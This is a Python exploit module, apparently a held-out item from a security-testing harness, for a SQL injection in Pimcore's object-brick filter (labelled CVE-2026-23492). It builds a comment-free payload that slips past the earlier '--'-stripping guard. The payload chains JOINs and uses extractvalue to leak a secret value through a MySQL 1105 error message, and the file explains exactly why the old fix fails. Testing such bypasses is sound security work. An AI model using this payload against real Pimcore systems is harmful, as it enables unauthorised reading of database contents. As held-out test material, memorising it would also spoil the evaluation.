#!/usr/bin/env python3
r"""[HELD-OUT] CVE-2026-23492 residual exploit for pimcore-cve-2026-23492.

Same object-brick JOIN sink and same error-based read-exfil channel as the seed, but
COMMENT-FREE. Instead of a `-- ` comment to swallow the code's `_<cid> \`<ob>\` ON ...`
tail, the brick key is crafted so that the tail is consumed by a valid JOIN chain:

    ... JOIN (SELECT extractvalue(1,...) id) c ON 1=1 JOIN object_relations

the trailing `_<cid>` the code appends turns `... JOIN object_relations` into
`... JOIN object_relations_<cid>` (a real table). Using `object_relations` instead of
`object` avoids column-ambiguity errors (`oo_id`) that occur when the main object table
is joined twice. The two backtick-quoted `<ob>` occurrences become harmless (long)
quoted identifiers. The whole statement parses, so MySQL evaluates extractvalue at
runtime -> error 1105 "XPATH syntax error" carrying the flag.

The CVE-2023-30848 guard (str_replace('--','') + catch SyntaxErrorException) is a no-op
here: there is no '--' to strip, and error 1105 is NOT a SyntaxErrorException (1064),
so it is not caught -> the flag surfaces on v1.

CVE-2026-23492 closes exactly this on v2 by validating each brick key with
Objectbrick\\Definition::getByKey($ob): the crafted key is not a real brick =>
InvalidArgumentException => the query is never built.

  reaches flag on v1 (comment-free; 1105 not caught)
  BLOCKED on v2 (brick-key whitelist rejects the crafted $ob)

__CID__ is replaced at runtime by the oracle with the actual class ID (e.g. "1").
"""

# JOIN tail target: Pimcore 10.5 appends `.o_id` and its `_<cid>` suffix must
# resolve to a real table with an o_id column (object_relations_1 has none ->
# use object_brick_query_bundledata_1); Pimcore 11 uses `.id` and object_relations_1.
_JOIN_TARGETS = {
    "v0": "object_brick_query_bundledata",
    "v1": "object_brick_query_bundledata",
    "v2": "object_relations",
}


def candidate(*, version="v1") -> dict:
    inj = ("bundledata___CID__ b ON 1=1 JOIN (SELECT extractvalue(1,concat(0x7e,"
           "(SELECT flag FROM pcb_secret LIMIT 1))) id) c ON 1=1 JOIN "
           + _JOIN_TARGETS.get(version, "object_relations"))
    return {
        "probe_id": "bypass-cve-2026-23492",
        # comment-free brick-key injection: survives str_replace('--',''); 1105 not caught on v1.
        "fields": [inj + "~x"],
        "filter": '[{"property":"id","operator":"gt","value":"0","type":"numeric"}]',
        "class": "testclass",
    }
